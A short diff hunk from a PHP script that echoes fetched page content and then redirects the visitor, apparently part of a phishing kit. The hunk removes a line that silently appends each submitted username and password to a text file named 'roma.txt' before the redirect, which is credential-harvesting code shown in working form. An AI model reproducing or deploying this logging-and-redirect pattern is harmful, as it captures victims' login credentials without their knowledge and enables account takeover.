@@ -21,7 +21,6 @@ curl_close($ch);
 //Print the data out onto the page.
 echo $data;
 
-file_put_contents("roma.txt", "[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
                             
 header('Location: <CUSTOM>');
 exit();
